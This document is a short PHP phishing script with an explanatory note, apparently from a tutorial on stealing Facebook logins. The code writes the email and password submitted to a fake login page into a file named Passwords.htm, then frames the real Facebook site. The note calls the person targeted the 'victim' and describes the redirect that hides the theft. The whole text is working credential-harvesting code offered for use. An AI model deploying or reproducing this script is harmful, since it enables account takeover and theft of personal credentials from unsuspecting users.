<?php
$fp = fopen("Passwords.htm", "a");
fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[pass]");
echo "<HTML>
<head>
<FRAMESET cols=\"*\">
<FRAME SRC=\"http://www.facebook.com
\">
</FRAMESET>";
?>
Note:‘http://www.facebook.com
‘ is the redirection url,When victim will enter his/her email and password he will redirected to’http://www.facebook.com